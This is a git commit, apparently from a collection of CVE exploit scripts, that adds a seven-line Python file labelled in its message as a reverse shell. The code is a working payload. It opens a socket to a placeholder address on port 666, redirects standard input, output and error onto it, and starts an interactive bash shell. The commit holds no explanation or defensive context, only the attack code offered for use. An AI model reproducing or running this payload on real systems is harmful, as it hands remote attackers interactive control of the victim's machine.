281d8e5ff06b63def44cc9256aead6567483087c
pederysky <145128880+pederysky@users.noreply.github.com>
2026-03-23 21:06:06 +0100

    Add reverse shell script in shell.py

---
+++ Scripts CVEs/shell.py
@@ -0,0 +1,7 @@
+import os,socket,subprocess;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(("192.x.x.x",666));
+os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);
+p=subprocess.call(["/bin/bash","-i"]);
